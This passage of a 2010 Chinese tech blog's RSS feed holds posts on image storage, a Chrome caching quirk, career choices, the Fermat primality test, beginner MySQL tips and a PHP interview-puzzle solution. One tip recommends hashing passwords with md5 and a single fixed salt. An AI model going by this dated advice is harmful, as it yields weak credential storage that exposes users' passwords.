URL，你不知道头像的主人是谁：有可能其他人也用相同的图片做头像，或者在某人的相册里。</p><p><span style="font-weight: bold; font-family: '微软雅黑'">问题</span></p><p>再次强调，这<span style="font-weight: bold; font-family: '微软雅黑'">仅仅</span>是个例子，针对每个网站、每个应用的需求，方案也是千变万化的。大家都有各自关注的重点。</p><p>所有图片都是不删的，删的只是针对图片的引用页而已，也就是说，如果一个人传了几张私人图片、由自己删除后，如果别人知道图片 URL，则还是可以访问的（或者更简单的情况，某个被设置为限少数人访问的相册的图片 URL 被公开），我不清楚实际运营时这个问题是否会很严重，总之不好回避。</p><p>对 MU 的调配是基于人工的，而不是任何高科技的自维护系统。老实说我认为就目前（2010 年）来说，除了 SSD 在某些特殊情况下能值回票价，其他的一些高科技玩意真的看不懂，我目前还很排斥云××类东西，不仅仅是贵，最主要的原因是，即使钱花到了，它们做的还没说的那么好。一个外行可以把技术视为魔法和银弹，但作为从业者，基本的问题是应该知道的，云存储再牛逼，他也是跑在机械硬盘上的，而我们现有的工作，有很重要的一部分是在约定的系数下，加减成本和可靠性两个指标，使其乘积最大。如果磁盘数量在可控范围内，偶尔找人花几个工时维护一下就够，我相信普通的热备就已经是好的选择。除非容量已经上 PB 了，或者到了<a href="http://twitter.com/calon/status/19044301129">无缘无故</a>的程度，可反过来说，那些魔法软件又有多少 PB 级案例？总之云××可以等等，第一批冲上去的大都是炮灰。现阶段我还是觉得每GB平均半毛钱不到的硬盘真他妈便宜好用</p><p><img src="http://rss.soulogic.com/track/407" /></p>]]></description></item>
<item><title>Chrome 里 Max-age 和 ETag 的古怪逻辑</title><link>https://soulogic.com/archives/406</link><author>zhengkai@gmail.com (郑凯)</author><category>代码 Coding</category><guid>cd2fb9a9bd33dd46d9856f075a1d01d8</guid><pubDate>Wed, 21 Jul 2010 15:02:52 +0800</pubDate><description><![CDATA[<p><span style="font-weight: bold; font-family: '微软雅黑'">Update in 2010-08-11</span><br /><span style="font-weight: bold; font-family: '微软雅黑'">注意：本文已失效，看来这是 Chrome 的 BUG，且已被修复，我还以为是就是想这么设定呢</span></p><hr /><p>简单的说，对于 Header 里同时有 Max-age 和 ETag 的情况，Chrome 跟所有其他浏览器的解释都是相反的</p><p>按我的理解，如果同时设置了 Max-age 和 ETag，在 Max-age 的有效期内，浏览器是不再发请求的，等过了有效期，再在请求里带上 ETag。但是在 Chrome 里却会起反效果：如果一个网页里的图片只有 ETag，那么在 Chrome 当前 tab 页的整个生存周期，可能只会偶尔被重新读取，可如果同时包含了 ETag 和 Max-age，那么你每点一次链接，那些图片都要被重新读取（也就是比没设 Max-age 时更糟糕了）。这只有网很慢的时候才会被观察到，就像我昨晚用 ssh -D 连接一个远程 phpMyAdmin 时，每点一步操作，都会看到所有图标白上那么一两秒，然后才被读出来，直到调用了内置的 Developer Tools &#62; Resources 时，看到一大堆图片的 304 返回时，才明白是 ETag 跟 Max-age 冲突了，索性在 Apache 里设置全局的 FileETag none</p><p>由于 Chrome 的出格，导致 ETag 更加鸡肋了，我怀疑只有极少数的 AJAX POST 才需要像<a href="https://soulogic.com/archives/395">以前介绍过的</a>那样由脚本自己做 ETag。当页面被 squid/CDN 缓存了两层之后，最简单有效的方法还是设置超大 Max-age、一旦有更改就变文件名。</p><p><img src="http://rss.soulogic.com/track/406" /></p>]]></description></item>
<item><title>活该如此</title><link>https://soulogic.com/archives/405</link><author>zhengkai@gmail.com (郑凯)</author><category>铂 Platinum</category><guid>d3e6532cbd3dd00ccb1342f6ba5fe197</guid><pubDate>Sun, 20 Jun 2010 02:44:17 +0800</pubDate><description><![CDATA[<p>几年前在家门口的一家小饭馆吃饭的时候，我想明白了“为什么所有的服务员都这么糟糕”的问题：老板只愿意为一个服务员的职位出这些钱，而一个服务员好到远不止这些钱的时候，她就不会去干服务员了。当然，引申的还有为什么老板只愿意出这些钱，因为你去吃饭给他带去的利润只值这些，等等。</p><p>佐证我这个观点的是去年跟河北某 IDC 托管主机的时候，那个客服很不错，办事很麻利很干净，也试着自己搭站点什么的，偶尔还会问我一些问题，我当时就奇怪这样的人怎么会甘心当客服，果不其然，几个月之后他就辞职了，之后换过两三个客服，不用说，都很糟糕，我还投诉过其中的一个。</p><p>后来看到《卧底经济学》的时候，还知道有人做过正统的归纳、论证，提出一个词叫“比较优势”，末了作者还自嘲自己之所以可以靠写经济专栏为生，是因为更牛逼的人虽然可以写经济专栏写得比他更好，但是人家可以靠别的方式挣到更多的钱。</p><p>在充分的市场竞争环境下，所有人都会坐到相对于自己来说最正确的位置，我还是喜欢更为简短且粗俗的描述：所有人活该如此。</p><p>举个例子，公司和员工个人的利益有很大分歧，<a href="http://twitter.com/lifesinger/status/994933942">如 lifesinger 所说</a></p><blockquote><p>偶尔去蓝色理想转转，感慨JS版为啥这么多人在重复造轮子？感慨之后又感慨不重复造轮子的话，又怎么能学会JS？对于老板来说，复用性节约money，对于程序员来说，重复造轮子是学习的好途径。</p></blockquote><p>而最近碰到些事情，让我第一次认真琢磨一个以前从来不认为是问题的问题：为什么有人愿意屈就公司的需要而自毁前程。当然，答案也是上面说过的，活该如此。</p><p>具体事情没法多说，只是一直做网站的我，从来没细想过，对倭外包、或者对 discuz/uchome 做二次开发的人，会有这么这么多，其实他们才是所谓 IT 行业的主流，而自己实际是被边缘化了的。</p><p>在不同角度看这个问题是不一样的，首先事情本身到没到“毁前程”这种程度，以及对“屈就”的定量问题，就像物理性质的“弹性”概念，玻璃也有弹性的，看你跟什么东西比了。</p><p>我最大的“屈就”是在 05 年的时候写了几个月的 JavaScript，不过相信真正对 JS 很懂的人不会认为我这句话是冒犯。当时公司的那个客户端，本身界面要经常改动，还要跟网站本身有一些交互，所以我把这部分工作接下来了，软件的 GUI 部分只有一个 IE 窗口控件，除了常见的浮动窗口之类的效果，还要做个进度条效果，而且是很多进度条，总之我在给我自己定目标、找动力。但无论如何那都不是一个让人愉快的工作，会在各种各样的地方出现所谓的“偶然复杂度”（不知道现学现卖的这个词是否恰当），比方说，当时蹩脚的杀毒软件会让我绘制的 DIV 菜单消失、某个版本的 msn activex 会导致页面出现离奇错误（尽管那页没用到 activex，但是禁用 msn activex 后就一切都好了）、某特定语言的 win 98 下的正则不能用两个 / 而必须用 new RegExp，等等等等，并且当时除了 prototype 刚刚在世界掀起波澜，还没有任何框架，我也只是在学习，也不可能马上用在产品上。等做得差不多了，也有一两个人可以勉强接替我这部分工作的人，我跟经理说，我不想干这个了，假设接替的人胜任不了，界面的变动也只能暂时放放了。</p><p>我的理由是基于直觉的：干这个有天花板。前几天还在一次面试的时候解释过这问题：互联网对高水平的 JS/CSS 的需求量太少了，如果全国需要 1000 个能解决 c10k 问题的人，可能相同等级的 JS 程序员也就需要 3 个，显然后者更有竞争难度。</p><p>但直到两天前，我在买阮一峰翻译的《软件随想录》时顺便买的一本<a href="http://book.douban.com/review/1449189/">《Joel 谈优秀软件开发方法》</a>里，重新看到了 Paul Graham 的《伟大的黑客》，我早就忘了作者和文章标题，也忘了是什么时候看到的了，但我记得其中每一段话的要素，下面这两段对我尤其重要，我一直把他作为判断工作的准则之一：</p><blockquote><p>所有这类讨厌的小问题都有一个共同特征，既您从中学不到任何东西。写一个编译器很有趣，那是因为您可以从中学会编译原理。为充满 BUG 的软件编写接口程序您却什么也学不到，因为那些 BUG 是随机的。因此，优秀的黑客会尽量回避那些讨厌的小问题。这不是挑三拣四，更主要的是为了自保——长期面对那样的小问题会使人变得愚蠢。黑客们的做法其实与模特们戒食乳酪的道理是一样的。</p></blockquote><blockquote><p>我不知道您能否培养出这些品质，但至少可以不去抑制它们。如果您有希望成为一名伟大的黑客，那么我建议您最好做到：一方面，绝不在枯燥的项目上浪费生命（除非不这么做您和家人就会饿死）；另一方面，做事必须有始有终、滴水不漏。我所认识的所有伟大黑客似乎都是如此，也许他们根本就没想过还有其他什么选择。</p></blockquote><p>纵使自己最终无法达到 Paul Graham 笔下的黑客标准，起码，你不遵守这些就肯定无法达到了。另外这还是我不沾酒的一个漂亮的理由：我觉得那玩意伤脑子，哪怕只损伤万分之一我也无法接受。半年前基于同样的理由我连可乐都戒了。</p><p>回到最初的问题上，让我直白（可能会有尴尬）地把话说出来，如果你觉得你干的活挺傻逼的，马上跟老板说辞职，然后再考虑找工作的事，除非你自己也觉得，你只配干这种傻逼活。这是对我的几个同事想说而没能说出口的话。</p><p>最近常常在想，03 年急于找工作的时候，是由于幸运，还是性格使然，而没沦落到改模板/做外包的工人，在目睹了像<a href="http://jerrylovesrebol.blogspot.com/2010/05/blog-post_26.html">蔡學鏞所说</a>的“大多數的工程師並不是「做了五年的系統開發」，而是「做了一年的系統開發，然後重複五次」”的实例后，还是有些后怕。</p><hr /><p><span style="font-weight: bold; font-family: '微软雅黑'">Update in 2010.07.29</span></p><p>刚看完《美丽新世界》，里面有句话叫“伊普西隆式的牺牲要由伊普西隆来完成（Only an Epsilon can be expected to make Epsilon sacrifices）”</p><p><img src="http://rss.soulogic.com/track/405" /></p>]]></description></item>
<item><title>扔硬币锦标赛</title><link>https://soulogic.com/archives/404</link><author>zhengkai@gmail.com (郑凯)</author><category>记事本 Notebook</category><guid>71750fee57fbcfc275c85e1f619fa408</guid><pubDate>Thu, 17 Jun 2010 23:04:18 +0800</pubDate><description><![CDATA[<p>我是从 <a href="http://book.douban.com/subject/1949744/">对冲基金风云录</a> 里看到的，可当我四处引用这个故事的时候，又忘了出处，直到前几天偶然重新翻到，说是这段文字是引自巴菲特的</p><hr /><p>假设有一个“全美扔硬币锦标赛”，每名选手要在报名参赛时交上 10 美元，凑成奖金发给最后入围的 8 名获胜者。想一想吧，如果有 2 亿人参赛，奖金就是 20 亿美元。每星期会有一场比赛，好让人们实现梦想。6 个月过后，将有 32 名常胜将军脱颖而出，他们中的每个人差不多都已连续扔对硬币 25 次。想想媒体能煽起多大热潮吧！</p><p>到这时候，事态开始变得疯狂。有人成了杂志上大肆报道的草根英雄；有人跑到电视脱口秀上大谈扔硬币技巧，讲解自己如何让硬币在半空中获得神力，又是如何在它落地前用意念施法，每辑节目要向电视台收费 5 万美元；另一些人开始争先恐后出书，书名诸如《扔硬币扔成百万富翁》、《上帝为何让我赢》之类。这时，愤怒的大学教授们拍案而起，在《华尔街日报》上大谈“有效市场”、“扔硬币原理”、“零和游戏”等理论，力图证明大赛的结果只是出于随机。当然，32 名常胜将军会挺身反击，质问他们：“如果没有人能做到，为何我们 32 个人做到了？”在第 16 轮比赛开始前的数周内，入围选手们对异性的吸引力显著提高，有些人还成了阿斯彭滑雪屋和佛罗里达房地产的推销对象。</p><p><img src="http://rss.soulogic.com/track/404" /></p>]]></description></item>
<item><title>费马检查</title><link>https://soulogic.com/archives/403</link><author>zhengkai@gmail.com (郑凯)</author><category>记事本 Notebook</category><guid>681d3aaf9e03a74b44cf813151ce4543</guid><pubDate>Thu, 10 Jun 2010 23:26:25 +0800</pubDate><description><![CDATA[<p>去年看到这段的时候就想扒到网上，却一直懒得动手。</p><p>一直读到注解的时候，还是有点震撼的。我知道费马等一些人都热衷于“纯数学”，那些被看起来毫无实用价值的“纯理论”，可这费马检查，却是全世界的服务器每秒中都要运行无数次的 RSA 算法的理论基石。就我自己而言，每天使用 SSH 的时候都要用到。而几位科学家把这这一切联系起来的过程，实在称得上是“玄妙”了。</p><hr /><p><a href="http://book.douban.com/subject/1148282/">《计算机程序的构造和解释》</a> 第二版中文版 P34-35</p><p>费马小定理：如果 n 是一个素数，a 是小于 n 的任意正整数，那么 a 的 n 次方与 a 模 n 同余。（两个数称为是模 n 的同余，如果它们除以 n 的余数相同。数 a 除以 n 的余数称为 a 取模 n 的余数，或简称为 a 取模 n）。</p><p>如果 n 不是素数，那么，一般而言，大部分的 a &#60; n 都将不满足上面的关系。这就引出了下面这个检查素数的算法：对于给定的整数 n，随机任取一个 a &#60; n 并计算出 a<sup>n</sup> 取模 n 的余数。如果得到的结果不等于 a，那么 n 就肯定不是素数。如果它就是 a，那么 n 是素数的机会就很大。现在再另取一个随机的 a 并采用同样的方式检查。如果它满足上述等式，那么我们就能对 n 是素数有更大的信心了。通过检查越来越多的 a 值，我们就可以不断增加对有关结果的信心。这一算法称为费马检查。</p><p>……</p><p>概率方法</p><p>从特征上看，费马检查与我们前面已熟悉的算法都不一样。前面那些算法都保证计算的结果一定正确，而费马检查得到的结果则只有概率上的正确性。说得更准确些，如果数 n 不能通过费马检查，我们可以确信它一定不是素数。而 n 通过了这一检查的事实只能作为它是素数的一个很强的证据，但却不是对 n 为素数的保证。我们能说的是，对于任何数 n，如果执行这一检查的次数足够多，而且看到 n 通过了检查，那么就能使这一素数检查出错的概率减小到所需要的任意程度。</p><p>不幸的是，这一断言并不完全正确。因为确实存在着一些能骗过费马检查的整数：某些数 n 不是素数但却具有这样的性质，对任意整数 a &#60; n，都有 a<sup>n</sup> 与 a 模 n 同余。由于这种数极其罕见，因此费马检查在实践中还是很可靠的 <sup>注1</sup>。也存在着一些费马检查的不会受骗的变形，它们也像费马方法一样，在检查整数 n 是否为素数时，选择随机的整数 a &#60; n 并去检查某些依赖于 n 和 a 的关系。另一方面，与费马检查不同的是可以证明，对任意的数 n，相应条件对整数 a &#60; n 中的大部分都不成立，除非 n 是素数。这样，如果 n 对某个随机选出的 a 能通过检查，n 是素数的机会就大于一半。如果 n 对两个随机选择的 a 能通过检查，n 是素数的机会就大于四分之三。通过用更多随机选择的 a 值运行这一检查，我们可以使出现错误的概率减小到所需要的任意程度。</p><p>能够证明，存在着使这样的出错机会达到任意小的检查算法，激发了人们对这类算法的极大兴趣，已经形成了人所共知称为概率算法的领域。在这一领域中已经有了大量研究工作，概率算法也已被成功应用于许多重要领域 <sup>注2</sup>。</p><hr /><p>注1：能够骗过费马检查的数称为 Carmichael 数，我们对它们知之甚少，只知其非常罕见，在 100 000 000 之内有 255 个 Carmichael 数，其中最小的几个是 561、1105、1729、2465、2821 和 6601。在检查很大的数是否为素数时，所用选择是随机的。撞上能欺骗费马检查的值的机会比宇宙射线导致计算机在执行“正确”算法中出错的机会还要小。对算法只考虑第一因素而不考虑第二因素恰好表现出数学与工程的不同。</p><p>注2：概率素数检查的最惊人应用之一是在密码学的领域中。虽然完成 200 位数的因数分解现在在计算机上还是不现实的，但用费马检查却可以在几秒内判断这么大的数的素性。这一事实成为 Rivset、Shamir 和 Adleman (1977) 提出的一种构造“不可摧毁的密码”的技术基础，这一 RSA 算法已经成为提高电子通信安全性的一种使用广泛的技术。因为这项研究和其他相关研究的发展，素数研究这一曾被认为是“纯粹”数学的缩影，是仅仅因为其自身原因而被研究的课题，现在已经变成在密码学、电子资金流通和信息查询领域里有重要实际应用的问题了。</p><p><img src="http://rss.soulogic.com/track/403" /></p>]]></description></item>
<item><title>几个常见的初级问题</title><link>https://soulogic.com/archives/402</link><author>zhengkai@gmail.com (郑凯)</author><category>代码 Coding</category><guid>0a1caf9bed06bc6f7a7b039dc36f7efa</guid><pubDate>Wed, 09 Jun 2010 23:24:34 +0800</pubDate><description><![CDATA[<h2>Password Hash 应该加 Salt</h2><p>不加 Salt 是很常见、危害很大的问题。我一直是加的，但是到了去年才知道这个词叫 <a href="http://en.wikipedia.org/wiki/Salt_(cryptography)">Salt</a></p><p>通常，密码存在数据库里时用的是 MD5，但绝不应该是原文的 MD5，应该加个字符串（随便什么都可以，但是要永久固定，不能每次随机）再 MD5，例如 <span class="monospace">md5($sPassword . &#34;somesalt&#34;);</span></p><p>是否加 Salt 的区别在于，如果用户数据库被黑了，或者被内鬼 dump 走了，你不会暴露用户的密码原文，因为常见密码的 md5 随便用 Google 都可以找到，而绝大部分人又都是一个或最多几个密码，导致用户的其他帐号也有危险。</p><p>同时这个问题又是无法纠正的，一旦用户表开始记录真实用户，就没法改了。</p><p>如果你有机会从头开始构建一个新项目的 Passport，记得加 Salt，哪怕是最简单的。</p><h2>对于中文内容，MySQL 存储的字符集用 UCS-2</h2><p>没错，我们显示页面时用的 UTF-8、跟 MySQL 连接的时候也用的 <span class="monospace">SET NAMES utf8</span>，但是存储的时候，如果你打算在表和字段的字符集上用 UTF-8，那么应该改成 UCS-2。</p><p>因为 UTF-8 本身是不定长的，而预留位置总要按最坏的打算来，因此如果你定义了一个 CHAR(3) 的字段的字符集是 UTF-8，那么它占用的空间是 9 个字节，而不是 3 个或者平均值 6 个，这样才能保证你无论是存三个汉字还是三个字母，都能保证装的下，但我们知道，有些空间被浪费了。而 UCS-2 的基本特性是任何字符都按两个字节来存，也就是每个 CHAR(3) 占 6 个字节。</p><p>要验证可以不断的更改字符集，并用类似下面的 SQL 来查看 Avg_row_length</p><blockquote class="code"><p>SHOW TABLE STATUS FROM `database_name` LIKE &#39;table_name&#39;</p></blockquote><p>对于定宽（<span class="monospace">Row_format == Fixed</span>）的表，尤其应该如此。</p><p>不是说这事有多大的性能提升，而主要在于简单并且无副作用。如果一个表因为这个设置而从 8G 变成 6G，怎么着也应该有些好处吧。</p><h2>RSS 的删除</h2><p>虽然说出来弊大于利，但从技术角度讲是应该知道的</p><p>如果是数据库里关于删除有个标记位，比方说 <span class="monospace">WHERE</span> 条件里有个 <span class="monospace">del != &#34;Y&#34;</span> 之类的，在页面显示上是应该如此，但 RSS 作为一种给机器读的文本，则是另一套机制。</p><p>RSS 本来就只是显示有哪些变化，而非显示总共有哪些内容，因此如果跟网页一样只是不显示，就会被认为是没有变化，而在 Google Reader 或者别的什么 RSS 阅读器里永久保存。</p><p>因此不应该是在 WHERE 条件的时候滤掉删除的内容，而是在显示 RSS 的时候判定，如果是已被删除的条目，则相应的 title 和 description（或者叫 content，取决于你的 RSS 版本）显示为空字符串或者“deleted”之类的</p><p>如果新浪把这个问题纠正了，韩寒的 blog 估计就真得搬家了。这非我的本意，但韩寒换 BSP 容易，更多人碰到自己的文章想删删不掉的时候会很麻烦。</p><p><img src="http://rss.soulogic.com/track/402" /></p>]]></description></item>
<item><title>劝</title><link>https://soulogic.com/archives/401</link><author>zhengkai@gmail.com (郑凯)</author><category>记事本 Notebook</category><guid>e32d38b3320db994e5856d32d3a751fc</guid><pubDate>Mon, 07 Jun 2010 22:52:29 +0800</pubDate><description><![CDATA[<p>Zheng Kai 22:35<br />你那狗怎么办，这个要小心<br />刚想跟你说，其实养孩子一开始挺金贵，现在觉得养孩子跟养狗差不多，也是每天拉出去溜……只是比狗溜的时间长……</p><p>我那朋友，把 gtalk 的 status 改了，叫 饲养员 22:37<br /> <br />Sunmast 22:38<br />我那狗还是放在上海阿<br />会对小孩不利？ 22:38<br /> <br />Zheng Kai 22:39<br />我是觉得非常不好	</p><p>Sunmast 22:39<br />为啥？	</p><p>Zheng Kai 22:39<br />要么娃很惨，要么狗很惨	</p><p>Sunmast 22:40<br />。。。<br />照顾不过来吗 22:40<br /> <br />Zheng Kai 22:40<br />我老婆怀孕的时候我还想着把我家猫留着养，等孩子生出来我就非常利索的送人了	</p><p>Sunmast 22:41<br />有病毒吗？	</p><p>Zheng Kai 22:41<br />1.猫毛很多，对成人没事，对孩子我接受不了，最主要原因<br />2.孩子小的时候怕猫抓孩子，得经常关阳台，那猫活着也挺憋屈 22:42<br /> <br />Sunmast 22:42<br />对孩子的呼吸系统有影响吧	</p><p>Zheng Kai 22:43<br />甚至都可能没影响，但就是万分之一几率，这理由都成立了	</p><p>Sunmast 22:43<br />嗯	</p><p>Zheng Kai 22:43<br />一只猫或者一条狗顶你孩子的万分之一么？完全顶不了	</p><p>Sunmast 22:44<br />嗯，本来想着让孩子玩玩的<br />呵呵 22:44<br /> <br />Zheng Kai 22:45<br />我当时也想的特别好，我还盘算着猫活到孩子十来岁的时候就该到寿命了，也算给孩子个挫折教育，结果孩子抱回来，我突然就对从来没在乎过的猫毛非常敏感了<br />以前经常我打游戏的时候猫趴我肚子上，一趴两个小时，全身猫毛 22:46<br />当然，孩子在半懂半不懂事哇哇直闹的时候，你可能会怀念你那很懂事的狗……</p><p><img src="http://rss.soulogic.com/track/401" /></p>]]></description></item>
<item><title>《百姓网公开笔试题：查询条件的子集判断》的一份 PHP 答卷</title><link>https://soulogic.com/archives/400</link><author>zhengkai@gmail.com (郑凯)</author><category>代码 Coding</category><guid>017beed6f62b6531212935eda884f7f5</guid><pubDate>Tue, 11 May 2010 14:16:11 +0800</pubDate><description><![CDATA[<p>原题见 <a href="http://home.wangjianshuo.com/cn/20100505_ccceeieeaece.htm">百姓网公开笔试题：查询条件的子集判断</a></p><p>我的答卷在 <a href="http://soulogic.com/subset_test/subset_test.tar.gz">http://soulogic.com/subset_test/subset_test.tar.gz</a></p><p>演示地址为 <a href="http://soulogic.com/subset_test/">http://soulogic.com/subset_test/</a></p><hr /><p>碰到这道题时才意识到自己的见识浅薄，非等到这种题出来才能明白，高等数学对于程序员而言是多么重要。其中最难最关键的部分是在留言里看到了 <a href="http://qmigh.blogspot.com/2010/05/blog500-querybuilderqueryandor-tyler.html">qmigh</a> 的解释才搞定的。</p><p>这道题分三部分：把查询语句转成数组结构，然后把层级混乱的条件最终分解成 以 OR 关联的 AND 合集（也就是 qmigh 所解释的），以及按规则来读取并判断两个数组。在我的代码里，Class TreeStore 负责前两步，Class SetCheck 负责后一步。</p><p>由于我完全说不出任何术语，只能把数组的转换过程列一下了。</p><p>原始语句</p><blockquote class="code"><p>a = 1 AND (b = 1 OR (c = 1 AND (e &#62; 1 OR f = 1)))</p></blockquote><p>第一步，循环用正则，从最里面的括号开始，分解出每一级。这样每一级里面都没括号了</p><blockquote class="code"><p>Array<br />(<br /> &#160; &#160;[1] =&#62; e &#62; 1 OR f = 1<br /> &#160; &#160;[2] =&#62; c = 1 AND _1<br /> &#160; &#160;[3] =&#62; b = 1 OR _2<br /> &#160; &#160;[4] =&#62; a = 1 AND _3<br />)</p></blockquote><p>按照 AND OR 的优先级进一步分解</p><blockquote class="code"><p>Array<br />(<br /> &#160; &#160;[AND] =&#62; Array<br /> &#160; &#160; &#160; &#160;(<br /> &#160; &#160; &#160; &#160; &#160; &#160;[0] =&#62; a = 1<br /> &#160; &#160; &#160; &#160; &#160; &#160;[1] =&#62; Array<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;(<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;[OR] =&#62; Array<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;(<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;[0] =&#62; b = 1<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;[1] =&#62; Array<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;(<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;[AND] =&#62; Array<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;(<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;[0] =&#62; c = 1<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;[1] =&#62; Array<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;(<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;[OR] =&#62; Array<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;(<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;[0] =&#62; e &#62; 1<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;[1] =&#62; f = 1<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;)</p><p> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;)</p><p> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;)</p><p> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;)</p><p> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;)</p><p> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;)</p><p> &#160; &#160; &#160; &#160;)</p><p>)</p></blockquote><p>将上述数组最终分解成 OR 下的一堆 AND</p><blockquote class="code"><p>Array<br />(<br /> &#160; &#160;[OR] =&#62; Array<br /> &#160; &#160; &#160; &#160;(<br /> &#160; &#160; &#160; &#160; &#160; &#160;[0] =&#62; Array<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;(<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;[AND] =&#62; Array<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;(<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;[0] =&#62; a = 1<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;[1] =&#62; b = 1<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;)</p><p> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;)</p><p> &#160; &#160; &#160; &#160; &#160; &#160;[1] =&#62; Array<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;(<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;[AND] =&#62; Array<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;(<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;[0] =&#62; a = 1<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;[1] =&#62; c = 1<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;[2] =&#62; e &#62; 1<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;)</p><p> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;)</p><p> &#160; &#160; &#160; &#160; &#160; &#160;[2] =&#62; Array<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;(<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;[AND] =&#62; Array<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;(<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;[0] =&#62; a = 1<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;[1] =&#62; c = 1<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;[2] =&#62; f = 1<br /> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;)</p><p> &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160;)</p><p> &#160; &#160; &#160; &#160;)</p><p>)</p></blockquote><p>其实就是按 qmigh 说的，做一下转换，把最开始的表达式转换为</p><blockquote class="code"><p>(a = 1 AND b = 1) OR (a = 1 AND c = 1 AND e &#62; 1) OR (a = 1 AND c = 1 AND f = 1)</p></blockquote><p>如果只有一个表达式，可以理解为只有一个元素的 AND</p><p>如果</p><blockquote class="code"><p>(a &#62; 3) AND (b &#60; 4)</p></blockquote><p>可以用数组表示为</p><blockquote class="code"><p>array(<br />	[0] =&#62; a &#62; 3<br />	[1] =&#62; b &#60; 4<br />)</p></blockquote><p>那么</p><blockquote class="code"><p>a &#62; 3</p></blockquote><p>可以用数组表示为</p><blockquote class="code"><p>array(<br />	[0] =&#62; a &#62; 3<br />)</p></blockquote><p>OR 也同理</p><p>用来判断时的数组样子，也就是 Class TreeStore 的最终输出</p><blockquote class="code"><p>Array<br />(<br /> &#160; &#160;[0] =&#62; Array<br /> &#160; &#160; &#160; &#160;(<br /> &#160; &#160; &#160; &#160; &#160; &#160;[a] =&#62; Array<br /> &#160; &#160; &#160; 